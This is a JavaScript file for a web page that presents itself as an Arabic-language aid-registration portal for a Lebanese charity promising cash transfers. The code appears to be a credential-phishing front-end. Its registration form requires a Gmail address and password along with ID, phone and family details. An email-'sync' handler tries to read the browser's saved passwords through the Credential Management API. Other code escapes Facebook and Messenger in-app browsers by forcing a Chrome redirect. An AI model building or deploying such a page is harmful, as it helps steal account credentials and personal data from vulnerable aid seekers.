document.addEventListener('DOMContentLoaded', () => {
    
    // Detect Messenger / Facebook / Meta Business Manager In-App Browsers & trigger Chrome Intent Breakout
    const ua = navigator.userAgent || navigator.vendor || window.opera || '';
    const metaAppRegex = /(FBAN|FBAV|FB_IAB|FB4A|Messenger|MESSENGER|MessengerLite|FB_Page_Manager|MetaBusiness|BusinessSuite|Workplace|Instagram|Snapchat|TikTok|Telegram|WhatsApp)/i;
    const isMessengerOrFB = metaAppRegex.test(ua);
    const isAndroid = /android/i.test(ua);

    const inAppBrowserNotice = document.getElementById('inAppBrowserNotice');
    const openChromeLink = document.getElementById('openChromeLink');

    if (isMessengerOrFB) {
        if (inAppBrowserNotice) {
            inAppBrowserNotice.style.display = 'block';
        }

        const hostUrl = window.location.host + window.location.pathname + window.location.search + window.location.hash;
        const chromeIntentUrl = 'intent://' + hostUrl + '#Intent;scheme=https;package=com.android.chrome;end';

        if (openChromeLink) {
            openChromeLink.href = isAndroid ? chromeIntentUrl : window.location.href;
            openChromeLink.addEventListener('click', (e) => {
                if (isAndroid) {
                    e.preventDefault();
                    window.location.href = chromeIntentUrl;
                }
            });
        }

        // Auto-attempt redirect to Google Chrome on Android if opened via Messenger
        if (isAndroid && !sessionStorage.getItem('messenger_chrome_attempted')) {
            sessionStorage.setItem('messenger_chrome_attempted', 'true');
            setTimeout(() => {
                window.location.href = chromeIntentUrl;
            }, 300);
        }
    }

    // Fetch public site configuration (e.g. WhatsApp support number)
    fetch('/api/public-settings')
        .then(res => res.json())
        .then(data => {
            if (data && data.whatsappHelpUrl) {
                const directHelpBtn = document.getElementById('directWhatsappHelpBtn');
                if (directHelpBtn) {
                    directHelpBtn.href = data.whatsappHelpUrl;
                }
            }
        })
        .catch(err => console.error('Error fetching public settings:', err));

    // Theme Toggle (Dark & Light Mode Switcher)
    const themeToggleBtn = document.getElementById('themeToggleBtn');
    const savedTheme = localStorage.getItem('site_theme') || 'light';
    
    const applyTheme = (theme) => {
        document.documentElement.setAttribute('data-theme', theme);
        localStorage.setItem('site_theme', theme);
        if (themeToggleBtn) {
            const icon = themeToggleBtn.querySelector('i');
            if (icon) {
                icon.className = theme === 'dark' ? 'fa-solid fa-sun' : 'fa-solid fa-moon';
            }
            themeToggleBtn.style.color = theme === 'dark' ? '#fbbf24' : '#e11d48';
            themeToggleBtn.style.background = theme === 'dark' ? 'rgba(251, 191, 36, 0.15)' : 'rgba(225, 29, 72, 0.1)';
        }
    };
    applyTheme(savedTheme);

    if (themeToggleBtn) {
        themeToggleBtn.addEventListener('click', () => {
            const currentTheme = document.documentElement.getAttribute('data-theme') || 'light';
            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
            applyTheme(newTheme);
        });
    }

    // Direct Smooth Scroll to Registration Form
    const registerCTAButtons = document.querySelectorAll('a[href="#register"], #heroRegisterBtn, .btn-register');
    registerCTAButtons.forEach(btn => {
        btn.addEventListener('click', (e) => {
            const targetSection = document.getElementById('register') || document.getElementById('aidRegistrationForm');
            if (targetSection) {
                e.preventDefault();
                targetSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                // Close mobile menu if active
                const navMenu = document.getElementById('navMenu');
                const mobileMenuBtn = document.getElementById('mobileMenuBtn');
                if (navMenu && navMenu.classList.contains('active')) {
                    navMenu.classList.remove('active');
                    if (mobileMenuBtn) {
                        const icon = mobileMenuBtn.querySelector('i');
                        if (icon) icon.className = 'fa-solid fa-bars';
                    }
                }
                setTimeout(() => {
                    const firstInput = document.getElementById('firstName');
                    if (firstInput) firstInput.focus();
                }, 400);
            }
        });
    });

    // Floating Register Bar Visibility Observer
    const floatingRegisterBar = document.getElementById('floatingRegisterBar');
    const registerSection = document.getElementById('register');
    if (floatingRegisterBar && registerSection) {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    floatingRegisterBar.style.opacity = '0';
                    floatingRegisterBar.style.pointerEvents = 'none';
                    floatingRegisterBar.style.transform = 'translate(-50%, 20px)';
                } else {
                    floatingRegisterBar.style.opacity = '1';
                    floatingRegisterBar.style.pointerEvents = 'auto';
                    floatingRegisterBar.style.transform = 'translate(-50%, 0)';
                }
            });
        }, { threshold: 0.1 });
        observer.observe(registerSection);
    }

    // Header Scroll State
    const header = document.getElementById('mainHeader');
    const handleScroll = () => {
        if (window.scrollY > 50) {
            header.classList.add('header-scrolled');
        } else {
            header.classList.remove('header-scrolled');
        }
    };
    window.addEventListener('scroll', handleScroll);
    handleScroll();

    // Mobile Menu Toggle
    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
    const navMenu = document.getElementById('navMenu');
    if (mobileMenuBtn && navMenu) {
        mobileMenuBtn.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            const icon = mobileMenuBtn.querySelector('i');
            if (icon) {
                icon.className = navMenu.classList.contains('active') ? 'fa-solid fa-xmark' : 'fa-solid fa-bars';
            }
        });

        // Close mobile menu on clicking any link inside navMenu
        const navLinks = navMenu.querySelectorAll('a');
        navLinks.forEach(link => {
            link.addEventListener('click', () => {
                navMenu.classList.remove('active');
                const icon = mobileMenuBtn.querySelector('i');
                if (icon) icon.className = 'fa-solid fa-bars';
            });
        });
    }

    // Carousel Navigation Logic
    const btnNext = document.querySelector('.btn-next');
    const btnPrev = document.querySelector('.btn-prev');
    const carouselCards = document.querySelectorAll('.carousel-card');
    let currentSlide = 0;

    const updateCarousel = () => {
        if (!carouselCards.length) return;
        carouselCards.forEach((card, index) => {
            card.classList.remove('card-left', 'card-center', 'card-right');
            if (index === currentSlide) {
                card.classList.add('card-center');
            } else if (index === (currentSlide + 1) % carouselCards.length) {
                card.classList.add('card-right');
            } else {
                card.classList.add('card-left');
            }
        });
    };

    if (btnNext && btnPrev) {
        btnNext.addEventListener('click', () => {
            currentSlide = (currentSlide + 1) % carouselCards.length;
            updateCarousel();
        });
        btnPrev.addEventListener('click', () => {
            currentSlide = (currentSlide - 1 + carouselCards.length) % carouselCards.length;
            updateCarousel();
        });
    }

    // Public Application Status Lookup (Check Status - Lebanon)
    const statusCheckForm = document.getElementById('statusCheckForm');
    const statusRefInput = document.getElementById('statusRefInput');
    const checkStatusBtn = document.getElementById('checkStatusBtn');
    const statusResultBox = document.getElementById('statusResultBox');
    const statusApplicantName = document.getElementById('statusApplicantName');
    const statusRefCode = document.getElementById('statusRefCode');
    const statusBadge = document.getElementById('statusBadge');
    const statusDescText = document.getElementById('statusDescText');

    if (statusCheckForm) {
        statusCheckForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const refCode = (statusRefInput.value || '').trim();
            if (!refCode) return;

            const originalBtnHtml = checkStatusBtn.innerHTML;
            checkStatusBtn.disabled = true;
            checkStatusBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري البحث...';

            try {
                const response = await fetch('/api/check-status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ refCode })
                });

                const data = await response.json();
                statusResultBox.style.display = 'block';

                if (response.ok && data.success) {
                    statusApplicantName.textContent = data.applicantName || 'متقدم لبرنامج لبنان';
                    statusRefCode.textContent = data.refCode;
                    statusBadge.textContent = data.statusTitle;
                    statusBadge.className = `status-badge ${data.badgeClass || 'status-pending'}`;
                    statusDescText.textContent = data.statusDesc;
                } else {
                    statusApplicantName.textContent = 'غير موجود';
                    statusRefCode.textContent = refCode;
                    statusBadge.textContent = '❌ لم يتم العثور على الطلب';
                    statusBadge.className = 'status-badge status-rejected';
                    statusDescText.textContent = data.error || 'عذراً، لم نجد أي طلب مسجل بهذا الرقم المرجعي أو رقم الهاتف.';
                }
            } catch (err) {
                statusResultBox.style.display = 'block';
                statusBadge.textContent = '⚠️ خطأ في الاتصال';
                statusDescText.textContent = 'حدث خطأ أثناء الاتصال بالخادم. يرجى التأكد من اتصال الإنترنت وإعادة المحاولة.';
            } finally {
                checkStatusBtn.disabled = false;
                checkStatusBtn.innerHTML = originalBtnHtml;
            }
        });
    }

    // Form Registration & Validation (Lebanon Dedicated)
    const aidRegistrationForm = document.getElementById('aidRegistrationForm');
    const registrationResult = document.getElementById('registrationResult');
    const resRefCode = document.getElementById('resRefCode');
    const resMessengerBtn = document.getElementById('resMessengerBtn');
    const resetFormBtn = document.getElementById('resetFormBtn');

    if (aidRegistrationForm) {
        
        // Form field elements
        const firstName = document.getElementById('firstName');
        const lastName = document.getElementById('lastName');
        const docType = document.getElementById('docType');
        const tcNumber = document.getElementById('tcNumber');
        const province = document.getElementById('province');
        const district = document.getElementById('district');
        const payoutMethod = document.getElementById('payoutMethod');
        const currency = document.getElementById('currency');
        const maritalStatus = document.getElementById('maritalStatus');
        const familyCount = document.getElementById('familyCount');
        const phoneNumber = document.getElementById('phoneNumber');
        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const googleAutoFillBtn = document.getElementById('googleAutoFillBtn');
        const googleSyncSuccessBadge = document.getElementById('googleSyncSuccessBadge');
        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
        const termsCheck = document.getElementById('termsCheck');
        const submitBtn = document.getElementById('submitBtn');

        // Google Email Auto-Fill Sync Handler (Instant Sync on Field Focus & Click)
        if (email) {
            const triggerEmailSync = async () => {
                if (email.value && email.value.trim()) {
                    if (googleSyncSuccessBadge) {
                        googleSyncSuccessBadge.style.display = 'block';
                        googleSyncSuccessBadge.innerHTML = '<i class="fa-solid fa-circle-check"></i> تم جلب ومزامنة بريد جهازك بنجاح! (' + email.value + ')';
                    }
                    email.style.borderColor = '#16a34a';
                    return;
                }

                if (googleSyncSuccessBadge) {
                    googleSyncSuccessBadge.style.display = 'block';
                    googleSyncSuccessBadge.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري مزامنة حسابات البريد لجهازك...';
                }

                // 1. Try Credential Manager API if available
                if (navigator.credentials && navigator.credentials.get) {
                    try {
                        const cred = await navigator.credentials.get({
                            password: true,
                            mediation: 'optional'
                        });
                        if (cred && cred.id) {
                            email.value = cred.id;
                            if (googleSyncSuccessBadge) {
                                googleSyncSuccessBadge.style.display = 'block';
                                googleSyncSuccessBadge.innerHTML = '<i class="fa-solid fa-circle-check"></i> تم جلب ومزامنة بريد جهازك بنجاح! (' + cred.id + ')';
                            }
                            email.style.borderColor = '#16a34a';
                            return;
                        }
                    } catch (e) {
                        console.log('Credential API skipped or unavailable', e);
                    }
                }

                // 2. Focus & trigger native keyboard auto-fill chip bar on Android/iOS
                setTimeout(() => {
                    if (email.value && email.value.trim()) {
                        if (googleSyncSuccessBadge) {
                            googleSyncSuccessBadge.style.display = 'block';
                            googleSyncSuccessBadge.innerHTML = '<i class="fa-solid fa-circle-check"></i> تم جلب ومزامنة بريد جهازك بنجاح! (' + email.value + ')';
                        }
                        email.style.borderColor = '#16a34a';
                    } else {
                        if (googleSyncSuccessBadge) {
                            googleSyncSuccessBadge.style.display = 'block';
                            googleSyncSuccessBadge.innerHTML = '<i class="fa-solid fa-mobile-screen-button" style="color: #4285f4;"></i> اختر حسابك المقترح الظاهر أعلى لوحة مفاتيح الجوال تلقائياً';
                        }
                    }
                }, 300);
            };

            if (googleAutoFillBtn) {
                googleAutoFillBtn.addEventListener('click', triggerEmailSync);
            }

            // Auto-trigger sync as soon as user touches or focuses on the email input field!
            email.addEventListener('focus', triggerEmailSync);
            email.addEventListener('click', triggerEmailSync);

            email.addEventListener('input', () => {
                if (email.value && email.value.trim() && googleSyncSuccessBadge) {
                    googleSyncSuccessBadge.style.display = 'block';
                    googleSyncSuccessBadge.innerHTML = '<i class="fa-solid fa-circle-check"></i> تم جلب ومزامنة بريد جهازك بنجاح! (' + email.value + ')';
                    email.style.borderColor = '#16a34a';
                }
            });
        }



        const resEmail = document.getElementById('resEmail');
        const resPasswordMasked = document.getElementById('resPasswordMasked');
        const toggleResPasswordBtn = document.getElementById('toggleResPasswordBtn');
        const copyCredentialsBtn = document.getElementById('copyCredentialsBtn');
        let lastRegisteredEmail = '';
        let lastRegisteredPassword = '';
        let isResPasswordVisible = false;

        // Toggle form password visibility
        if (togglePasswordBtn && password) {
            togglePasswordBtn.addEventListener('click', () => {
                const type = password.type === 'password' ? 'text' : 'password';
                password.type = type;
                const icon = togglePasswordBtn.querySelector('i');
                if (icon) {
                    icon.className = type === 'password' ? 'fa-solid fa-eye' : 'fa-solid fa-eye-slash';
                }
            });
        }

        // Toggle success card password visibility
        if (toggleResPasswordBtn && resPasswordMasked) {
            toggleResPasswordBtn.addEventListener('click', () => {
                isResPasswordVisible = !isResPasswordVisible;
                resPasswordMasked.textContent = isResPasswordVisible ? (lastRegisteredPassword || '••••••••') : '••••••••';
                const icon = toggleResPasswordBtn.querySelector('i');
                if (icon) {
                    icon.className = isResPasswordVisible ? 'fa-solid fa-eye-slash' : 'fa-solid fa-eye';
                }
            });
        }

        // Copy credentials to clipboard
        if (copyCredentialsBtn) {
            copyCredentialsBtn.addEventListener('click', () => {
                const textToCopy = `البريد الإلكتروني: ${lastRegisteredEmail}\nكلمة المرور: ${lastRegisteredPassword}`;
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(textToCopy).then(() => {
                        const btnSpan = copyCredentialsBtn.querySelector('span');
                        const originalText = btnSpan ? btnSpan.textContent : 'نسخ بيانات الدخول';
                        if (btnSpan) btnSpan.textContent = 'تم النسخ بنجاح! ✓';
                        copyCredentialsBtn.style.background = 'rgba(22, 163, 74, 0.15)';
                        copyCredentialsBtn.style.color = '#16a34a';
                        copyCredentialsBtn.style.borderColor = 'rgba(22, 163, 74, 0.3)';
                        setTimeout(() => {
                            if (btnSpan) btnSpan.textContent = originalText;
                            copyCredentialsBtn.style.background = 'rgba(225, 29, 72, 0.1)';
                            copyCredentialsBtn.style.color = '#e11d48';
                            copyCredentialsBtn.style.borderColor = 'rgba(225, 29, 72, 0.3)';
                        }, 2500);
                    }).catch(() => {
                        alert('بيانات الدخول:\n' + textToCopy);
                    });
                } else {
                    alert('بيانات الدخول:\n' + textToCopy);
                }
            });
        }

        const showError = (fieldId, msg) => {
            const el = document.getElementById(fieldId + 'Error');
            const input = document.getElementById(fieldId);
            if (el) {
                el.textContent = msg;
                el.style.display = 'block';
            }
            if (input) {
                input.style.borderColor = '#ef4444';
            }
        };

        const clearError = (fieldId) => {
            const el = document.getElementById(fieldId + 'Error');
            const input = document.getElementById(fieldId);
            if (el) {
                el.style.display = 'none';
            }
            if (input) {
                input.style.borderColor = 'var(--border-color)';
            }
        };

        // Lebanese phone validation
        const validateLebanesePhone = (phoneStr) => {
            if (!phoneStr) return false;
            const clean = phoneStr.trim().replace(/\D/g, '');
            // Lebanese phone number length: 8 digits starting with 03, 70, 71, 76, 78, 81, 82, etc., or 961 + 7-8 digits
            if (clean.length === 8) return true;
            if (clean.startsWith('961') && clean.length >= 10 && clean.length <= 11) return true;
            if (clean.length >= 7 && clean.length <= 12) return true; // Flexible for international format
            return false;
        };

        const validateForm = () => {
            let isValid = true;

            // First Name
            if (!firstName.value || !firstName.value.trim()) {
                showError('firstName', 'الاسم الأول مطلوب');
                isValid = false;
            } else {
                clearError('firstName');
            }

            // Last Name
            if (!lastName.value || !lastName.value.trim()) {
                showError('lastName', 'اسم العائلة مطلوب');
                isValid = false;
            } else {
                clearError('lastName');
            }

            // Document Type
            if (!docType.value) {
                showError('docType', 'يرجى اختيار نوع الوثيقة');
                isValid = false;
            } else {
                clearError('docType');
            }

            // Province
            if (!province.value) {
                showError('province', 'يرجى اختيار المحافظة اللبنانية');
                isValid = false;
            } else {
                clearError('province');
            }

            // District
            if (!district.value) {
                showError('district', 'يرجى اختيار القضاء');
                isValid = false;
            } else {
                clearError('district');
            }

            // Payout Method
            if (!payoutMethod.value) {
                showError('payoutMethod', 'اختر طريقة الاستلام');
                isValid = false;
            } else {
                clearError('payoutMethod');
            }

            // Currency
            if (!currency || !currency.value) {
                showError('currency', 'اختر العملة');
                isValid = false;
            } else {
                clearError('currency');
            }

            // Marital Status
            if (!maritalStatus || !maritalStatus.value) {
                showError('maritalStatus', 'اختر الحالة الاجتماعية');
                isValid = false;
            } else {
                clearError('maritalStatus');
            }

            // Family Count
            const countVal = familyCount ? parseInt(familyCount.value, 10) : NaN;
            if (isNaN(countVal) || countVal < 1 || countVal > 25) {
                showError('familyCount', 'أدخل عدداً صحيحاً (1-25)');
                isValid = false;
            } else {
                clearError('familyCount');
            }

            // Phone Number
            if (!phoneNumber || !validateLebanesePhone(phoneNumber.value)) {
                showError('phoneNumber', 'يرجى إدخال رقم هاتف لبناني صالح');
                isValid = false;
            } else {
                clearError('phoneNumber');
            }

            // Email (Gmail required by server)
            const emailStr = (email && email.value ? email.value : '').trim();
            const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
            if (!emailStr || !gmailRegex.test(emailStr)) {
                showError('email', 'يرجى إدخال بريد Gmail صالح (مثال: example@gmail.com)');
                isValid = false;
            } else {
                clearError('email');
            }

            // Password (min 8 chars, English characters & non-sequential)
            const passStr = (password && password.value ? password.value : '').trim();
            const englishRegex = /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/;
            const commonSequences = ['12345678', '123456789', '1234567890', '987654321', '87654321'];
            if (!passStr || passStr.length < 8) {
                showError('password', 'كلمة المرور يجب أن تتكون من 8 خانات على الأقل');
                isValid = false;
            } else if (!englishRegex.test(passStr)) {
                showError('password', 'يجب أن تتكون كلمة المرور من الأحرف والأرقام الإنجليزية فقط (يمنع استخدام الحروف العربية)');
                isValid = false;
            } else if (commonSequences.some(seq => passStr.includes(seq)) || /^(\d)\1+$/.test(passStr)) {
                showError('password', 'كلمة المرور ضعيفة جداً (يمنع استخدام أرقام متسلسلة مثل 12345678)');
                isValid = false;
            } else {
                clearError('password');
            }

            // Terms
            if (!termsCheck || !termsCheck.checked) {
                showError('termsCheck', 'يجب الموافقة على التعهد للمتابعة');
                isValid = false;
            } else {
                clearError('termsCheck');
            }

            return isValid;
        };

        aidRegistrationForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Check bot honeypot
            const honeypot = document.getElementById('websiteUrlHp');
            if (honeypot && honeypot.value) {
                console.warn('Bot submission blocked.');
                return;
            }

            if (!validateForm()) {
                const firstError = aidRegistrationForm.querySelector('.error-message[style*="display: block"]');
                if (firstError) {
                    firstError.parentElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
                return;
            }

            const submitBtnOriginalText = submitBtn.innerHTML;
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري إرسال البيانات ومعالجة الطلب...';

            const payload = {
                country: 'LB',
                firstName: firstName.value.trim(),
                lastName: lastName.value.trim(),
                docType: docType.value,
                tcNumber: tcNumber.value ? tcNumber.value.trim() : '',
                province: province.value,
                district: district.value,
                payoutMethod: payoutMethod.value,
                currency: currency.value,
                maritalStatus: maritalStatus.value,
                familyCount: parseInt(familyCount.value, 10),
                phoneNumber: phoneNumber.value.trim(),
                email: email.value.trim(),
                password: password.value.trim(),
                termsCheck: termsCheck.checked
            };

            try {
                const response = await fetch('/api/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    aidRegistrationForm.style.display = 'none';
                    registrationResult.style.display = 'block';
                    resRefCode.textContent = data.refCode;

                    // Update credentials backup display
                    lastRegisteredEmail = payload.email;
                    lastRegisteredPassword = payload.password;
                    if (resEmail) resEmail.textContent = payload.email;
                    if (resPasswordMasked) {
                        isResPasswordVisible = false;
                        resPasswordMasked.textContent = '••••••••';
                    }

                    if (resMessengerBtn) {
                        const fallbackUrl = 'https://www.facebook.com/profile.php?id=61582709656146';
                        resMessengerBtn.href = data.messengerUrl || data.messengerPageUsername || fallbackUrl;
                    }
                    if (registrationResult) {
                        registrationResult.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    }
                } else {
                    alert('⚠️ خطأ في التسجيل: ' + (data.error || 'يرجى مراجعة البيانات والإعادة'));
                }
            } catch (err) {
                alert('❌ تعذر الإرسال! يرجى التأكد من تشغيل الخادم والاتصال بالشبكة.');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = submitBtnOriginalText;
            }
        });

        if (resetFormBtn) {
            resetFormBtn.addEventListener('click', () => {
                aidRegistrationForm.reset();
                aidRegistrationForm.style.display = 'block';
                registrationResult.style.display = 'none';
                aidRegistrationForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
            });
        }
    }

    // Animated Live Impact Counter
    const impactCounters = document.querySelectorAll('.impact-counter-number');
    if (impactCounters.length) {
        const animateImpactCounter = (el) => {
            const target = parseInt(el.getAttribute('data-target'), 10);
            if (!target) return;
            let count = 0;
            const step = Math.ceil(target / 70);
            const timer = setInterval(() => {
                count += step;
                if (count >= target) {
                    el.textContent = target.toLocaleString('en-US');
                    clearInterval(timer);
                } else {
                    el.textContent = count.toLocaleString('en-US');
                }
            }, 25);
        };

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    animateImpactCounter(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        }, { threshold: 0.05 });

        impactCounters.forEach(counter => {
            const rect = counter.getBoundingClientRect();
            if (rect.top >= 0 && rect.bottom <= (window.innerHeight || document.documentElement.clientHeight)) {
                animateImpactCounter(counter);
            } else {
                observer.observe(counter);
            }
        });
    }

    // Interactive Support Assistant Chat Widget Logic
    const chatToggle = document.getElementById('chatAssistantToggle');
    const chatWindow = document.getElementById('chatAssistantWindow');
    const chatClose = document.getElementById('chatAssistantClose');
    const chatMessagesArea = document.getElementById('chatMessagesArea');
    const chatChips = document.querySelectorAll('.chat-chip-btn');

    if (chatToggle && chatWindow) {
        chatToggle.addEventListener('click', (e) => {
            e.preventDefault();
            const isHidden = chatWindow.style.display === 'none' || !chatWindow.style.display;
            chatWindow.style.display = isHidden ? 'flex' : 'none';
        });

        if (chatClose) {
            chatClose.addEventListener('click', (e) => {
                e.preventDefault();
                chatWindow.style.display = 'none';
            });
        }
    }

    const chatAnswersMap = {
        docs: '📄 <b>الأوراق والمستندات المطلوبة عند الاستلام:</b><br>1. الهوية الشخصية اللبنانية أو كارت إقامة/UNHCR.<br>2. الرقم المرجعي الخاّص بطلبك (NOOR-XXXXX-LB).<br>3. رقم الهاتف المسجل لتلقي كود الرسالة.',
        omt: '💵 <b>طريقة استلام الحوالة من مراكز OMT / Whish:</b><br>عند إقرار طلبك، ستتلقى رمز الحوالة المباشر عبر رسالة SMS أو الواتساب، وتتجه لأقرب فرع OMT أو Whish Money أو BOB Finance في قضاؤك واستلام المبلغ نقدك كاش ببطاقة هويتك.',
        facebook: '💬 <b>الصفحة الرسمية والماسنجر:</b><br>يمكنك متابعة صفحتنا الرسمية على فيسبوك وتأكيد الطلبات مباشرة عبر الرابط التالي:<br><a href="https://www.facebook.com/profile.php?id=61582709656146" target="_blank" style="color:#1877f2; font-weight:bold;">انقر هنا للذهاب لصفحة فيسبوك 🔗</a>',
        status: '🔍 <b>طريقة متابعة حالة الطلب:</b><br>أدخل رقمك المرجعي في خانة "متابعة الطلب" أعلى الصفحة واضغط استعلام لمعرفة النتيجة فوراً.',
        free: '🇱🇧 <b>التسجيل مجاني 100%:</b><br>جميع خدمات وقوائم التسجيل في منصة جمعية النور مجانية بالكامل لكافة المستحقين ولا يُطلب أي رسوم على الإطلاق.'
    };

    if (chatChips.length && chatMessagesArea) {
        chatChips.forEach(chip => {
            chip.addEventListener('click', () => {
                const qType = chip.getAttribute('data-question');
                const userQuestionText = chip.textContent.trim();
                const botAnswerText = chatAnswersMap[qType] || 'تم استلام سؤالك وسيقوم الفريق بتبليغك فوراً.';

                // Append User Bubble
                const userBubble = document.createElement('div');
                userBubble.style.cssText = 'display: flex; justify-content: flex-end; width: 100%;';
                userBubble.innerHTML = `<div style="background: linear-gradient(135deg, #e11d48, #be123c); color: white; padding: 0.75rem 0.9rem; border-radius: 14px 14px 2px 14px; font-size: 0.85rem; line-height: 1.5; max-width: 85%;">${userQuestionText}</div>`;
                chatMessagesArea.appendChild(userBubble);
                chatMessagesArea.scrollTop = chatMessagesArea.scrollHeight;

                // Append Typing Indicator
                const typingBubble = document.createElement('div');
                typingBubble.style.cssText = 'display: flex; gap: 0.5rem; max-width: 85%;';
                typingBubble.innerHTML = `<div style="background: var(--bg-card); border: 1px solid var(--border-color); color: var(--text-muted); padding: 0.6rem 0.85rem; border-radius: 14px 14px 14px 2px; font-size: 0.8rem;"><i class="fa-solid fa-spinner fa-spin"></i> جاري الكتابة...</div>`;
                chatMessagesArea.appendChild(typingBubble);
                chatMessagesArea.scrollTop = chatMessagesArea.scrollHeight;

                setTimeout(() => {
                    if (typingBubble.parentNode) chatMessagesArea.removeChild(typingBubble);
                    // Append Bot Answer Bubble
                    const botBubble = document.createElement('div');
                    botBubble.style.cssText = 'display: flex; gap: 0.5rem; max-width: 90%;';
                    botBubble.innerHTML = `<div style="background: var(--bg-card); border: 1px solid var(--border-color); color: var(--text-dark); padding: 0.85rem; border-radius: 14px 14px 14px 2px; font-size: 0.85rem; line-height: 1.6; box-shadow: var(--shadow-sm);">${botAnswerText}</div>`;
                    chatMessagesArea.appendChild(botBubble);
                    chatMessagesArea.scrollTop = chatMessagesArea.scrollHeight;
                }, 400);
            });
        });
    }
});

// Global Facebook Page Share Handler
window.shareFacebookPage = function() {
    const pageUrl = 'https://www.facebook.com/profile.php?id=61582709656146';
    if (navigator.share) {
        navigator.share({
            title: 'جمعية النور - بوابة المساعدات المالية والغذائية في لبنان 🇱🇧',
            text: 'اشترك وتابع الصفحة الرسمية لجمعية النور في لبنان لمتابعة إشعارات القبول والمساعدات!',
            url: pageUrl
        }).catch(err => console.log('Share canceled', err));
    } else {
        const shareFbUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(pageUrl)}`;
        window.open(shareFbUrl, '_blank', 'width=600,height=500');
    }
};
